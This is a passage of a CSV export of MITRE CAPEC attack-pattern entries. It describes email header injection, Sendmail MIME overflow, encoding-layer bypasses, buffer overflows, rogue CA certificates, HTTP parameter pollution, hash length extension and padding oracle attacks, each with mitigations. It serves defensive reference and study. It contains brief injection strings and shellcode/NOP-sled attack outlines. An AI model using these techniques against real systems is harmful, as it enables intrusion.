email:LEVEL:Low::,N/A,N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::,"::Design: Perform validation on email header data::Implementation: Implement email filtering solutions on mail server or on MTA, relay server.::Implementation: Mail servers that perform strict validation may catch these attacks, because metacharacters are not allowed in many header variables such as dns names::","::To:<someone@example.com>From:<badguy@example.com>Header<SCRIPT>payme</SCRIPT>def: whatever::Meta-characters are among the most valuable tools attackers have to deceive users into taking some action on their behalf. E-mail is perhaps the most efficient and cost effective attack distribution tool available, this has led to the phishing pandemic. Meta-characters like w s d ^ can allow the attacker to escape out of the expected behavior to execute additional commands. Escaping out the process (such as email client) lets the attacker run arbitrary code in the user's process.::",::150::88::697::,N/A,N/A,https://capec.mitre.org/data/definitions/41.html
CAPEC-42,MIME Conversion,Detailed,Draft,An attacker exploits a weakness in the MIME conversion routine to cause a buffer overflow and gain control over the mail server machine. The MIME system is designed to allow various different information formats to be interpreted and sent via e-mail. Attack points exist when data are converted to MIME compatible format and back.,N/A,High,High,::NATURE:ChildOf:CAPEC ID:100::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target mail server] The adversary identifies a target mail server that they wish to attack.TECHNIQUE:Use Nmap on a system to identify a mail server service.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine viability of attack] Determine whether the mail server is unpatched and is potentially vulnerable to one of the known MIME conversion buffer overflows (e.g. Sendmail 8.8.3 and 8.8.4).::STEP:3:PHASE:Experiment:DESCRIPTION:[Find injection vector] Identify places in the system where vulnerable MIME conversion routines may be used.::STEP:4:PHASE:Experiment:DESCRIPTION:[Craft overflow content] The adversary crafts e-mail messages with special headers that will cause a buffer overflow for the vulnerable MIME conversion routine. The intent of this attack is to leverage the overflow for execution of arbitrary code and gain access to the mail server machine, so the adversary will craft an email that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversary's choosing.TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Send e-mail messages to the target system with specially crafted headers that trigger the buffer overflow and execute the shell code.::","::The target system uses a mail server.::Mail server vendor has not released a patch for the MIME conversion routine, the patch itself has a security hole or does not fix the original problem, or the patch has not been applied to the user's system.::",::SKILL:It may be trivial to cause a DoS via this attack pattern:LEVEL:Low::SKILL:Causing arbitrary code to execute on the target system.:LEVEL:High::,N/A,N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Stay up to date with third party vendor patches::Disable the 7 to 8 bit conversion. This can be done by removing the F=9 flag from all Mailer specifications in the sendmail.cf file. For example, a sendmail.cf file with these changes applied should look similar to (depending on your system and configuration): Mlocal, P=/usr/libexec/mail.local, F=lsDFMAw5:/|@qrmn, S=10/30, R=20/40,T=DNS/RFC822/X-Unix,A=mail -d $u Mprog, P=/bin/sh, F=lsDFMoqeu, S=10/30, R=20/40,D=$z:/,T=X-Unix,A=sh -c $u This can be achieved for the Mlocal and Mprog Mailers by modifying the .mc file to include the following lines: define(`LOCAL_MAILER_FLAGS',ifdef(`LOCAL_MAILER_FLAGS',`translit(LOCAL_MAILER_FLAGS, `9')',`rmn')) define(`LOCAL_SHELL_FLAGS',ifdef(`LOCAL_SHELL_FLAGS',`translit(LOCAL_SHELL_FLAGS, `9')',`eu')) and then rebuilding the sendmail.cf file using m4(1). From Exploiting Software, please see reference below.::Use the sendmail restricted shell program (smrsh)::Use mail.local::","::Attack Example: Sendmail Overflow A MIME conversion buffer overflow exists in Sendmail versions 8.8.3 and 8.8.4. Sendmail versions 8.8.3 and 8.8.4 are vulnerable to a buffer overflow in the MIME handling code. By sending a message with specially-crafted headers to the server, a remote attacker can overflow a buffer and execute arbitrary commands on the system with root privileges. Sendmail performs a 7 bit to 8 bit conversion on email messages. This vulnerability is due to the fact that insufficient bounds checking was performed while performing these conversions. This gave attacker an opportunity to overwrite the internal stack of sendmail while it is executing with root privileges. An attacker first probes the target system to figure out what mail server is used on the system and what version. An attacker could then test out the exploit at their leisure on their own machine running the same version of the mail server before using it in the wild.See also: CVE-1999-0047::",::120::119::74::20::,N/A,N/A,https://capec.mitre.org/data/definitions/42.html
CAPEC-43,Exploiting Multiple Input Interpretation Layers,Detailed,Draft,"An attacker supplies the target software with input data that contains sequences of special characters designed to bypass input validation logic. This exploit relies on the target making multiples passes over the input data and processing a layer of special characters with each pass. In this manner, the attacker can disguise input that would otherwise be rejected as invalid by concealing it with layers of special/escape characters that are stripped off by subsequent processing steps. The goal is to first discover cases where the input validation layer executes before one or more parsing layers. That is, user input may go through the following logic in an application: <parser1> --> <input validator> --> <parser2>. In such cases, the attacker will need to provide input that will pass through the input validator, but after passing through parser2, will be converted into something that the input validator was supposed to stop.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:267::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine application/system inputs where bypassing input validation is desired] The attacker first needs to determine all of the application's/system's inputs where input validation is being performed and where they want to bypass it.TECHNIQUE:While using an application/system, the attacker discovers an input where validation is stopping them from performing some malicious or unauthorized actions.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine which character encodings are accepted by the application/system] The attacker then needs to provide various character encodings to the application/system and determine which ones are accepted. The attacker will need to observe the application's/system's response to the encoded data to determine whether the data was interpreted properly.TECHNIQUE:Determine which escape characters are accepted by the application/system. A common escape character is the backslash character, '':TECHNIQUE:Determine whether URL encoding is accepted by the application/system.:TECHNIQUE:Determine whether UTF-8 encoding is accepted by the application/system.:TECHNIQUE:Determine whether UTF-16 encoding is accepted by the application/system.:TECHNIQUE:Determine if any other encodings are accepted by the application/system.::STEP:3:PHASE:Experiment:DESCRIPTION:[Combine multiple encodings accepted by the application.] The attacker now combines encodings accepted by the application. The attacker may combine different encodings or apply the same encoding multiple times.TECHNIQUE:Combine same encoding multiple times and observe its effects. For example, if special characters are encoded with a leading backslash, then the following encoding may be accepted by the application/system: .. With two parsing layers, this may get converted to . after the first parsing layer, and then, to . after the second. If the input validation layer is between the two parsing layers, then .. might pass a test for .. but still get converted to .. afterwards. This may enable directory traversal attacks.:TECHNIQUE:Combine multiple encodings and observe the effects. For example, the attacker might encode . as ., and then, encode . as &#92;&#46;, and then, encode that using URL encoding to %26%2392%3B%26%2346%3B::STEP:4:PHASE:Exploit:DESCRIPTION:[Leverage ability to bypass input validation] Attacker leverages their ability to bypass input validation to gain unauthorized access to system. There are many attacks possible, and a few examples are mentioned here.TECHNIQUE:Gain access to sensitive files.:TECHNIQUE:Perform command injection.:TECHNIQUE:Perform SQL injection.:TECHNIQUE:Perform XSS attacks.::",::User input is used to construct a command to be executed on the target system or as part of the file name.::Multiple parser passes are performed on the data supplied by the user.::,"::SKILL:Knowledge of various escaping schemes, such as URL escape encoding and XML escape characters.:LEVEL:Medium::",N/A,::Control characters are being detected by the filters repeatedly.::,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,::An iterative approach to input validation may be required to ensure that no dangerous characters are present. It may be necessary to implement redundant checking across different input validation layers. Ensure that invalid data is rejected as soon as possible and do not continue to work with it.::Make sure to perform input validation on canonicalized data (i.e. data that is data in its most standard form). This will help avoid tricky encodings getting past the filters.::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist would not be permitted to enter into the system.::,"::Using Escapes The backslash character provides a good example of the multiple-parser issue. A backslash is used to escape characters in strings, but is also used to delimit directories on the NT file system. When performing a command injection that includes NT paths, there is usually a need to double escape the backslash. In some cases, a quadruple escape is necessary. Original String: C:winntsystem32cmd.exe /c <parsing layer> Interim String: C:winntsystem32cmd.exe /c <parsing layer> Final String: C:winntsystem32cmd.exe /c This diagram shows each successive layer of parsing translating the backslash character. A double backslash becomes a single as it is parsed. By using quadruple backslashes, the attacker is able to control the result in the final string. [REF-1]::",::179::181::184::183::77::78::74::20::697::707::,N/A,N/A,https://capec.mitre.org/data/definitions/43.html
CAPEC-44,Overflow Binary Resource File,Detailed,Draft,"An attack of this type exploits a buffer overflow vulnerability in the handling of binary resources. Binary resources may include music files like MP3, image files like JPEG files, and any other binary file. These attacks may pass unnoticed to the client machine through normal usage of files, such as a browser loading a seemingly innocent JPEG file. This can allow the adversary access to the execution stack and execute arbitrary code in the target process.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:100::NATURE:ChildOf:CAPEC ID:23::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target software] The adversary identifies software that uses external binary files in some way. This could be a file upload, downloading a file from a shared location, or other means.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary creates a malicious binary file by altering the header to make the file seem shorter than it is. Additional bytes are added to the end of the file to be placed in the overflowed location. The adversary then deploys the file to the software to determine if a buffer overflow was successful.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow content] Once the adversary has determined that this attack is viable, they will specially craft the binary file in a way that achieves the desired behavior. If the source code is available, the adversary can carefully craft the malicious file so that the return address is overwritten to an intended value. If the source code is not available, the adversary will iteratively alter the file in order to overwrite the return address correctly.TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Once the adversary has constructed a file that will effectively overflow the targeted software in the intended way. The file is deployed to the software, either by serving it directly to the software or placing it in a shared location for a victim to load into the software.::",::Target software processes binary resource files.::Target software contains a buffer overflow vulnerability reachable through input from a user-controllable binary resource file.::,"::SKILL:To modify file, deceive client into downloading, locate and exploit remote stack or heap vulnerability:LEVEL:Medium::",N/A,N/A,::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::,"::Perform appropriate bounds checking on all buffers.::Design: Enforce principle of least privilege::Design: Static code analysis::Implementation: Execute program in less trusted process space environment, do not allow lower integrity processes to write to higher integrity processes::Implementation: Keep software patched to ensure that known vulnerabilities are not available for adversaries to target on host.::","::Binary files like music and video files are appended with additional data to cause buffer overflow on target systems. Because these files may be filled with otherwise popular content, the adversary has an excellent vector for wide distribution. There have been numerous cases, for example of malicious screen savers for sports teams that are distributed on the event of the team winning a championship.::",::120::119::697::,N/A,N/A,https://capec.mitre.org/data/definitions/44.html
CAPEC-441,Malicious Logic Insertion,Meta,Stable,"An adversary installs or adds malicious logic (also known as malware) into a seemingly benign component of a fielded system. This logic is often hidden from the user of the system and works behind the scenes to achieve negative impacts. With the proliferation of mass digital storage and inexpensive multimedia devices, Bluetooth and 802.11 support, new attack vectors for spreading malware are emerging for things we once thought of as innocuous greeting cards, picture frames, or digital projectors. This pattern of attack focuses on systems already fielded and used in operation as opposed to systems and their components that are still under development and part of the supply chain.",N/A,Medium,High,N/A,N/A,::Access to the component currently deployed at a victim location.::,N/A,N/A,N/A,::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands::,N/A,N/A,::284::,N/A,N/A,https://capec.mitre.org/data/definitions/441.html
CAPEC-45,Buffer Overflow via Symbolic Links,Detailed,Draft,"This type of attack leverages the use of symbolic links to cause buffer overflows. An adversary can try to create or manipulate a symbolic link file such that its contents result in out of bounds data. When the target software processes the symbolic link file, it could potentially overflow internal buffers with insufficient bounds checking.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:100::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary identifies a target application or program that might load in certain files to memory.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.TECHNIQUE:The adversary creates or modifies a symbolic link pointing to those files which contain an excessive amount of data. If creating a symbolic link to one of those files causes different behavior in the application, then an injection vector has been identified.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow file content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the specially crafted file content, the adversary creates a symbolic link from the identified resource to the malicious file, causing a targeted buffer overflow attack.::",::The adversary can create symbolic link on the target host.::The target host does not perform correct boundary checking while consuming data from a resources.::,::SKILL:An adversary can simply overflow a buffer by inserting a long string into an adversary-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::,N/A,::An adversary creating or modifying Symbolic links is a potential signal of attack in progress.::An adversary deleting temporary files can also be a sign that the adversary is trying to replace legitimate resources with malicious ones.::,::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,"::Pay attention to the fact that the resource you read from can be a replaced by a Symbolic link. You can do a Symlink check before reading the file and decide that this is not a legitimate way of accessing the resource.::Because Symlink can be modified by an adversary, make sure that the ones you read are located in protected directories.::Pay attention to the resource pointed to by your symlink links (See attack pattern named Forced Symlink race), they can be replaced by malicious resources.::Always check the size of the input data before copying to a buffer.::Use a language or compiler that performs automatic bounds checking.::Use an abstraction library to abstract away risky APIs. Not a complete solution.::Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.::Use OS-level preventative functionality. Not a complete solution.::","::Attack Example: Overflow with Symbolic Links in EFTP Server The EFTP server has a buffer overflow that can be exploited if an adversary uploads a .lnk (link) file that contains more than 1,744 bytes. This is a classic example of an indirect buffer overflow. First the adversary uploads some content (the link file) and then the adversary causes the client consuming the data to be exploited. In this example, the ls command is exploited to compromise the server software.::",::120::285::302::118::119::74::20::680::697::,N/A,N/A,https://capec.mitre.org/data/definitions/45.html
CAPEC-459,Creating a Rogue Certification Authority Certificate,Detailed,Draft,"An adversary exploits a weakness resulting from using a hashing algorithm with weak collision resistance to generate certificate signing requests (CSR) that contain collision blocks in their to be signed parts. The adversary submits one CSR to be signed by a trusted certificate authority then uses the signed blob to make a second certificate appear signed by said certificate authority. Due to the hash collision, both certificates, though different, hash to the same value and so the signed blob works just as well in the second certificate. The net effect is that the adversary's second X.509 certificate, which the Certification Authority has never seen, is now signed and validated by that Certification Authority.",N/A,Medium,Very High,::NATURE:ChildOf:CAPEC ID:473::,"::STEP:1:PHASE:Experiment:DESCRIPTION:[Craft Certificates] The adversary crafts two different, but valid X.509 certificates that when hashed with an insufficiently collision resistant hashing algorithm would yield the same value.::STEP:2:PHASE:Experiment:DESCRIPTION:[Send CSR to Certificate Authority] The adversary sends the CSR for one of the certificates to the Certification Authority which uses the targeted hashing algorithm. That request is completely valid and the Certificate Authority issues an X.509 certificate to the adversary which is signed with its private key.::STEP:3:PHASE:Exploit:DESCRIPTION:[Insert Signed Blob into Unsigned Certificate] The adversary takes the signed blob and inserts it into the second X.509 certificate that the attacker generated. Due to the hash collision, both certificates, though different, hash to the same value and so the signed blob is valid in the second certificate. The result is two certificates that appear to be signed by a valid certificate authority despite only one having been signed.::",::Certification Authority is using a hash function with insufficient collision resistance to generate the certificate hash to be signed::,::SKILL:Understanding of how to force a hash collision in X.509 certificates:LEVEL:High::SKILL:An attacker must be able to craft two X.509 certificates that produce the same hash value:LEVEL:High::SKILL:Knowledge needed to set up a certification authority:LEVEL:Medium::,::Knowledge of a certificate authority that uses hashing algorithms with poor collision resistance::A valid certificate request and a malicious certificate request with identical hash values::,N/A,::SCOPE:Access Control:SCOPE:AuthenticationTECHNICAL IMPACT:Gain Privileges::,::Certification Authorities need to stop using deprecated or cryptographically insecure hashing algorithms to hash the certificates that they are about to sign. Instead they should be using stronger hashing functions such as SHA-256 or SHA-512.::,"::MD5 Collisions The MD5 algorithm is not collision resistant, allowing attackers to use spoofing attacks to create rogue certificate Authorities.See also: CVE-2004-2761::SHA1 Collisions The SHA1 algorithm is not collision resistant, allowing attackers to use spoofing attacks to create rogue certificate Authorities.See also: CVE-2005-4900::PKI Infrastructure vulnerabilities Research has show significant vulnerabilities in PKI infrastructure. Trusted certificate authorities have been shown to use weak hashing algorithms after attacks have been demonstrated against those algorithms. Additionally, reliable methods have been demonstrated for generated MD5 collisions that could be used to generate malicious CSRs.::",::327::295::290::,N/A,N/A,https://capec.mitre.org/data/definitions/459.html
CAPEC-46,Overflow Variables and Tags,Detailed,Draft,"This type of attack leverages the use of tags or variables from a formatted configuration data to cause buffer overflow. The adversary crafts a malicious HTML page or configuration file that includes oversized strings, thus causing an overflow.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:100::NATURE:PeerOf:CAPEC ID:8::NATURE:PeerOf:CAPEC ID:10::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. Adversaries look for applications or programs that accept formatted files, such as configuration files, as input.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.TECHNIQUE:Knowing the type of file that an application takes as input, the adversary takes a normal input file and modifies a single variable or tag to contain a large amount of data. If there is a crash, this means that a buffer overflow attack is possible. The adversary will keep changing single variables or tags one by one until they see a change in behavior.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] The adversary will upload the crafted file to the application, causing a buffer overflow.::",::The target program consumes user-controllable data in the form of tags or variables.::The target program does not perform sufficient boundary checking.::,::SKILL:An adversary can simply overflow a buffer by inserting a long string into an adversary-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::,N/A,N/A,::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,"::Use a language or compiler that performs automatic bounds checking.::Use an abstraction library to abstract away risky APIs. Not a complete solution.::Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.::Use OS-level preventative functionality. Not a complete solution.::Do not trust input data from user. Validate all user input.::",::Attack Example: Overflow Variables and Tags in MidiPlug A buffer overflow vulnerability exists in the Yamaha MidiPlug that can be accessed via a Text variable found in an EMBED tag.See also: CVE-1999-0946::Attack Example: Overflow Variables and Tags in Exim A buffer overflow in Exim allows local users to gain root privileges by providing a long :include: option in a .forward file.See also: CVE-1999-0971::,::120::118::119::74::20::680::733::697::,N/A,N/A,https://capec.mitre.org/data/definitions/46.html
CAPEC-460,HTTP Parameter Pollution (HPP),Detailed,Draft,"An adversary adds duplicate HTTP GET/POST parameters by injecting query string delimiters. Via HPP it may be possible to override existing hardcoded HTTP parameters, modify the application behaviors, access and, potentially exploit, uncontrollable variables, and bypass input validation checkpoints and WAF rules.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:15::NATURE:CanPrecede:CAPEC ID:676::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Find User Input] The adversary finds anywhere in the web application that uses user-supplied input in a form or action. This can also be found by looking at parameters in the URL in the navigation bar of the browser::STEP:2:PHASE:Experiment:DESCRIPTION:[Add Duplicate Parameter Values] Once the adversary has identified what user input is used as HTTP parameters, they will add duplicates to each parameter one by one to observe the results. If the response from the HTTP request shows the duplicate parameter value concatenated with the original parameter value in some way, or simply just the duplicate parameter value, then HPP is possible.TECHNIQUE:In the URL, add a duplicate parameter by using the & delimiter. For example par1=val1 becomes par1=val1&par1=val2. Depending on the backend API, this could be treated as par1=val1, val2, which could lead to par1 being set to val2, ignoring val1.:TECHNIQUE:If the request is created based on user input directly on the page, the adversary will test by adding an encoded delimiter to the input. For example, the adverary might supply 1000%26action=withdraw and the backend might interpret a POST request with the paramters action=deposit&amount=1000&action=withdraw::STEP:3:PHASE:Exploit:DESCRIPTION:[Leverage HPP] Once the adversary has identified how the backend handles duplicate parameters, they will leverage this by polluting the paramters in a way that benefits them. In some cases, hardcoded parameters will be disregarded by the backend. In others, the adversary can bypass a WAF that might only check a parameter before it has been concatenated by the backend, resulting in malicious queries getting through.::",::HTTP protocol is used with some GET/POST parameters passed::,N/A,::Any tool that enables intercepting and tampering with HTTP requests::,N/A,N/A,"::Configuration: If using a Web Application Firewall (WAF), filters should be carefully configured to detect abnormal HTTP requests::Design: Perform URL encoding::Implementation: Use strict regular expressions in URL rewriting::Implementation: Beware of multiple occurrences of a parameter in a Query String::",N/A,::88::147::235::,TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Web Parameter Tampering::,N/A,https://capec.mitre.org/data/definitions/460.html
CAPEC-461,Web Services API Signature Forgery Leveraging Hash Function Extension Weakness,Standard,Draft,"When web services require callees to authenticate, they sometimes issue a token / secret to the caller that the caller is to use to sign their web service calls. In one such scheme the caller, when constructing a request, would concatenate all of the parameters passed to the web service with the provided authentication token and then generate a hash of the concatenated string (e.g., MD5, SHA1, etc.). That hash then forms the signature that is passed to the web service which is used on the server side to verify the origin authenticity and integrity of the message. There is a practical attack against an authentication scheme of this nature that makes use of the hash function extension / padding weakness. Leveraging this weakness, an attacker, who does not know the secret token, is able to modify the parameters passed to the web service by generating their own call and still generate a legitimate signature hash (as described in the notes). Because of the iterative design of the hash function, it is possible, from only the hash of a message and its length, to compute the hash of longer messages that start with the initial message and include the padding required for the initial message to reach a multiple of 512 bits. It is important to note that the attack not limited to MD5 and will work on other hash functions such as SHA1.",N/A,N/A,High,::NATURE:ChildOf:CAPEC ID:115::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Find a vulnerable web service] The adversary finds a web service that uses a vulnerable authentication scheme, where an authentication token is concatenated with the parameters of a request and then hashedTECHNIQUE:Read application documentation to learn about authentication schemes being used:TECHNIQUE:Observe web service traffic to look for vulnerable authentication schemes::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt adding padding to parameters] An adversary tests if they can simply add padding to the parameters of a request such that the request is technically changed, with the hash remaining the sameTECHNIQUE:Exploit the hash function extension / padding weakness with only padding to test the weakness::STEP:3:PHASE:Exploit:DESCRIPTION:[Add malicious parameters to request] Add malicious parameters to a captured request in addition to what is already present. Do this by exploiting the padding weakness of the hash function and send the request to the web service so that it believes it is authenticated and acts on the extra parameters.TECHNIQUE:Exploit the hash function extension / padding weakness by adding malicious parameters to a web service request such that it is still deemed authentic::",::Web services check the signature of the API calls::Authentication tokens / secrets are shared between the server and the legitimate client::The API call signature is generated by concatenating the parameter list with the shared secret and hashing the result.::An iterative hash function like MD5 and SHA1 is used.::An attacker is able to intercept or in some other way gain access to the information passed between the legitimate client and the server in order to retrieve the hash value and length of the original message.::The communication channel between the client and the server is not secured via channel security such as TLS::,"::SKILL:Medium level of cryptography knowledge, specifically how iterative hash functions work. This is needed to select proper padding.:LEVEL:Medium::","::Access to a function to produce a hash (e.g., MD5, SHA1) Tools that allow the attacker to intercept a message between the client and the server, specifically the hash that is the signature and the length of the original message concatenated with the secret bytes::",N/A,N/A,::Design: Use a secure message authentication code (MAC) function such as an HMAC-SHA1::,"::To leverage an attack against the has function extension / padding weakness, consider the message to be passed to the web service is M (this message includes the parameters passed to the web service concatenated with the secret token / key bytes). The message M is hashed and that hash is passed to the web service and is used for authentication. The attacker does not know M, but can see Hash (M) and Length (M). The attacker can then compute Hash (M || Padding (M) || M') for any M'. The attacker does not know the entire message M, specifically the attacker does not know the secret bytes, but that does not matter. The attacker is still able to sign their own message M' and make the called web service verify the integrity of the message without an error.::",::328::290::,N/A,N/A,https://capec.mitre.org/data/definitions/461.html
CAPEC-462,Cross-Domain Search Timing,Detailed,Draft,"An attacker initiates cross domain HTTP / GET requests and times the server responses. The timing of these responses may leak important information on what is happening on the server. Browser's same origin policy prevents the attacker from directly reading the server responses (in the absence of any other weaknesses), but does not prevent the attacker from timing the responses to requests that the attacker issued cross domain.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:54::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine service to send cross domain requests to] The adversary first determines which service they will be sending the requests to::STEP:2:PHASE:Experiment:DESCRIPTION:[Send and time various cross domain requests] Adversaries will send a variety of cross domain requests to the target, timing the time it takes for the target to respond. Although they won't be able to read the response, the adversary can use the time to infer information about what the service did upon receiving the request.TECHNIQUE:Using a GET request, leverage the img tag in conjunction with onload() / onerror() javascript events to time a response:TECHNIQUE:Using a POST request, leverage the iframe element and use the onload() event to time a response::STEP:3:PHASE:Exploit:DESCRIPTION:[Infer information from the response time] After obtaining reponse times to various requests, the adversary will compare these times and infer potentially sensitive information. An example of this could be asking a service to retrieve information and random usernames. If one request took longer to process, it is likely that a user with that username exists, which could be useful knowledge to an adversary.TECHNIQUE:Compare timing of different requests to infer potentially sensitive information about a target service::",::Ability to issue GET / POST requests cross domainJava Script is enabled in the victim's browserThe victim has an active session with the site from which the attacker would like to receive informationThe victim's site does not protect search functionality with cross site request forgery (CSRF) protection::,::SKILL:Some knowledge of Java Script:LEVEL:Low::,::Ability to issue GET / POST requests cross domain::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,::Design: The victim's site could protect all potentially sensitive functionality (e.g. search functions) with cross site request forgery (CSRF) protection and not perform any work on behalf of forged requests::Design: The browser's security model could be fixed to not leak timing information for cross domain requests::,N/A,::385::352::208::,N/A,N/A,https://capec.mitre.org/data/definitions/462.html
CAPEC-463,Padding Oracle Crypto Attack,Detailed,Draft,"An adversary is able to efficiently decrypt data without knowing the decryption key if a target system leaks data on whether or not a padding error happened while decrypting the ciphertext. A target system that leaks this type of information becomes the padding oracle and an adversary is able to make use of that oracle to efficiently decrypt data without knowing the decryption key by issuing on average 128*b calls to the padding oracle (where b is the number of bytes in the ciphertext block). In addition to performing decryption, an adversary is also able to produce valid ciphertexts (i.e., perform encryption) by using the padding oracle, all without knowing the encryption key.",N/A,N/A,High,::NATURE:ChildOf:CAPEC ID:97::,N/A,::The decryption routine does not properly authenticate the message / does not verify its integrity prior to performing the decryption operation::The target system leaks data (in some way) on whether a padding error has occurred when attempting to decrypt the ciphertext.::The padding oracle remains available for enough time / for as many requests as needed for the adversary to decrypt the ciphertext.::,N/A,::Ability to detect instances where a target system is vulnerable to an oracle padding attack Sufficient cryptography knowledge and tools needed to take advantage of the presence of the padding oracle to perform decryption / encryption of data without a key::,N/A,N/A,"::Design: Use a message authentication code (MAC) or another mechanism to perform verification of message authenticity / integrity prior to decryption::Implementation: Do not leak information back to the user as to any cryptography (e.g., padding) encountered during decryption.::","::An adversary sends a request containing ciphertext to the target system. Due to the browser's same origin policy, the adversary is not able to see the response directly, but can use cross-domain information leak techniques to still get the information needed (i.e., information on whether or not a padding error has occurred). This can be done using img tag plus the onerror()/onload() events. The adversary's JavaScript can make web browsers to load an image on the target site, and know if the image is loaded or not. This is 1-bit information needed for the padding oracle attack to work: if the image is loaded, then it is valid padding, otherwise it is not.::",::209::514::649::347::354::696::,N/A,N/A,https://capec.mitre.org/data/definitions/463.html
